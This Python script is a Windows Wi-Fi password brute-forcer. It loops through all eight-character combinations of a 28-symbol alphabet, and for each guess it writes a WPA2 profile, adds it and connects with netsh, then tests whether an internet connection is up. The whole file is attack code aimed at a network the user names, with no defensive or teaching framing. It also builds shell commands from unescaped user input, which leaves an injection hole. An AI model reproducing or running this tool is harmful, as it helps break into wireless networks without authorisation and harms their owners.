# import module
import time
import os
import socket


def is_connected():
    try:
        # connect to the host -- tells us if the host is actually
        # reachable
        socket.create_connection(("1.1.1.1", 53))
        return True
    except OSError:
        pass
    return False

# function to establish a new connection


def createNewConnection(name, SSID, password):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>"""+name+"""</name>
	<SSIDConfig>
		<SSID>
			<name>"""+SSID+"""</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>WPA2PSK</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>"""+password+"""</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
</WLANProfile>"""
    command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
    with open(name+".xml", 'w') as file:
        file.write(config)
    os.system(command)

# function to connect to a network


def connect(name, SSID):
    command = "netsh wlan connect name=\""+name + \
        "\" ssid=\""+SSID+"\" interface=Wi-Fi"
    os.system(command)

# function to display avavilabe Wifi networks


def displayAvailableNetworks():
    command = "netsh wlan show networks interface=Wi-Fi"
    os.system(command)


# display available netwroks
displayAvailableNetworks()

# input wifi name and password
name = input("Name of Wi-Fi: ")

password1 = {1: 'a', 2: 'b', 3: 'c', 4: 'd', 5: 'e', 6: 'f', 7: 'g', 8: 'h', 9: 'i', 10: 'j', 11: 'k', 12: 'l', 13: 'm', 14: 'n',
             15: 'o', 16: 'p', 17: 'q', 18: 'r', 19: 's', 20: 't', 21: 'u', 22: 'v', 23: 'w', 24: 'x', 25: 'y', 26: 'z', 27: '@', 28: '9'}


def passw():

    for i in range(1, 29):
        for j in range(1, 29):
            for k in range(1, 29):
                for l in range(1, 29):
                    for m in range(1, 29):
                        for n in range(1, 29):
                            for o in range(1, 29):
                                for p in range(1, 29):
                                    password = password1[i] + password1[j] + password1[k] + password1[l] + password1[
                                        m] + password1[n] + password1[o] + password1[p]
                                    #password = 'aman@999'
                                    print(password)
                                    # establish new connection
                                    createNewConnection(name, name, password)

                                    # connect to the wifi network
                                    connect(name, name)
                                    time.sleep(1)
                                    a = is_connected()
                                    if a == True:
                                        break
                                else:
                                    continue

                                break
                            else:
                                continue
                            break
                        else:
                            continue
                        break
                    else:
                        continue
                    break
                else:
                    continue
                break
            else:
                continue
            break
        else:
            continue
        break


passw()

# establish new connection
#createNewConnection(name, name, password)

# connect to the wifi network
#connect(name, name)
#print("If you aren't connected to this network, try connecting with the correct password!")
